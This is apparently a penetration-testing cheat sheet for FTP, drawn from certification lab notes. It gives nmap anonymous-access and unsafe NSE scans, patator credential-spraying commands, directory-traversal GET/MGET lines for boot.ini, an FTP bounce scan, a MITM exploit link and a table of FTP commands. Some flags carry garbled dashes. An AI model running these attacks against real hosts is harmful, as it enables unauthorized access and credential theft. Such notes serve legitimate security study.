## Scan for anonymous FTP
```
nmap ‐v ‐p 21 -­‐script=ftp‐anon.nse 192.168.11.200-254
```

## NSE
```
nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 <IP>
```

## Anonymous login
```
ftp ip_address
Username: anonymous
Password: any@email.com (if prompted)
```

## Bruteforce

`Hydra`
`Medusa`
`Brutus`

## Config files
```
ftpusers
ftp.conf
proftpd.conf
```

## MITM
- pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl

## Common FTP Commands

`send`

```
GET ../../../boot.ini
GET ../../../../../../boot.ini
MGET ../../../boot.ini
MGET ../../../../../../boot.ini
```

| Command | Description  |
| :------ | :----------- |
| ? |	Request help |
| ascii |	Set the mode of file transfer to ASCII (default / transmits 7bits per character) |
| binary | Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files)
| bye |	Exit the FTP environment (same as quit) |
| cd	| Change directory on the remote machine |
| close |	Rerminate a connection with another computer |
| close brubeck	| Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. |
| delete |	Delete a file in the current remote directory (same as rm in UNIX)
| get |	Copy one file from the remote machine to the local machine |
| get ABC DEF |	Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. |
| get ABC	| Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. |
| help	| Request a list of all available FTP command |
| lcd	| Change directory on your local machine (same as UNIX cd) |
| ls	| List the names of the files in the current remote directory |
| mkdir	| Make a new directory within the current remote directory |
| mget	| Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file |
| mget * | Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. |
| mput	| Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file |
| open	| Open a connection with another computer |
| open brubeck | Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). |
| put	| Copy one file from the local machine to the remote machine |
| pwd	| Find out the pathname of the current directory on the remote machine |
| quit	| Exit the FTP environment (same as bye) |
| rmdir	| Remove a directory in the current remote directory |


## Bruteforcing 
```
patator ftp_login host=10.11.1.220 port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’

patator ftp_login host=/root/oscp/lab-net2019/ftp-open.txt port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’

patator ftp_login host=FILE0 port=21 user=COMBO0 password=COMBO1 0=/root/oscp/lab-net2019/ftp-open.txt 1=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’ -x ignore:fgrep=’cannot log in.’ -x ignore:fgrep=’Login incorrect’ -l ftp_spray
```

## TCP FTP Bounce Scan
```
nmap –top-ports 1000 -vv -Pn -b anonymous:password@10.11.1.125:21 127.0.0.1
```